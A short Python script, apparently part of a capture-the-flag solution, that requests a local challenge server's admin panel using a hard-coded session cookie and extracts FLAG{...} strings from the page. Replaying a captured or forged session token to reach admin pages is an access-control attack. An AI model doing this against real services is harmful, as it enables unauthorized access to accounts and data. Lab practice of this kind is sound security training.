import requests, re

print("Fetching admin_panel...")
resp = requests.get("http://127.0.0.1:33166/admin_panel", 
                    headers={"Cookie": "session=OHPI_Y1N0-W_1RYNCv342OsWzpNdIqQLP9zIlMlvedk"})

print(f"Status: {resp.status_code}")
html = resp.text

matches = re.finditer(r'FLAG\{[^}]+\}', html)
for match in matches:
    print(f"FLAG: {match.group()}")

print("\\nDone")

